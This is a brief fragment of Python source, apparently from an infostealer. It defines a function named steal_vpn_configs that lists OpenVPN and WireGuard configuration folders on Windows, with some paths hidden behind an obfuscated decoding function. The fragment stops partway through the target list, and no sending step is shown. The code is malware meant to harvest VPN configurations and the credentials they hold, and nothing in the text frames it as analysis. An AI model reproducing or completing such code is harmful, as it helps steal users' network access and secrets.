...
def steal_vpn_configs():
    configs = []
    targets = {
        "OpenVPN": [Path.home() / "AppData\\Roaming\\OpenVPN\\config", __d("CVMlMio9BjATWDVXAxkDPx0mHRlJAlNrGiclMhkgBzEIXg==")],
        "WireGuard": [__d("CVMlMio9BjATWDVXAxkDPx0mHQFQFVh6PwgLCiYTLTYVWAQrBh8BPAcdNCRYE1RSJBo="), Path.home() / "AppData\\Local\\WireGuard\\Configurations"],
